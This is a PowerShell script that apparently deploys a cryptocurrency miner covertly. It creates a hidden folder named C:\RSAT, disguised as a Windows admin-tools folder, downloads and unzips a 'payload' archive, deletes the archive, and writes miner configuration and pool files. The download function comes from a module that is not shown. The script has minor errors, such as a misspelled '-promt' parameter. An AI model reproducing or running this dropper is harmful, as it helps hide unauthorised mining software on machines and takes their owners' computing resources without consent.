Import-Module "${psscriptroot}\APFunctions.psm1"

# Create an operations directory and hide it.  In the future we will load this variable from another location as this is intended to be called from fireBase.ps1

$opsDirectory = "C:\RSAT"

if (!(Test-Path $opsDirectory))
{
    mkdir $opsDirectory
	$f = Get-Item $opsDirectory -Force
	$f.Attributes = "Hidden"
}

# Check to see if our payload is already downloaded. Note we need to specify our TLS version to 1.2 to get the download to negoatiate a secure channel.

$payloadDestination = "$opsDirectory\payload.zip"

if (!(Test-Path $payloadDestination)) 

{
payload $payloadDestination
}

# Unzip contents of file and remove payload

Expand-Archive -LiteralPath $payloadDestination -DestinationPath $opsDirectory
Remove-Item $payloadDestination


# Load the newly unzipped directory path into a variable and set the destiation path to extract the config.

$unzipDir = Get-ChildItem -Path $opsDirectory -Directory -Name
$stakDir = "$opsDirectory\$unzipDir"

stripExcess (configTpl) | Out-File "$stakDir\config.txt"
stripExcess (poolTpl) | Out-File "$stakDir\pools.txt"
alterConfigTpl "$stakDir\config.txt"
alterPoolTpl "$stakDir\pools.txt"
read-host -promt "yo"
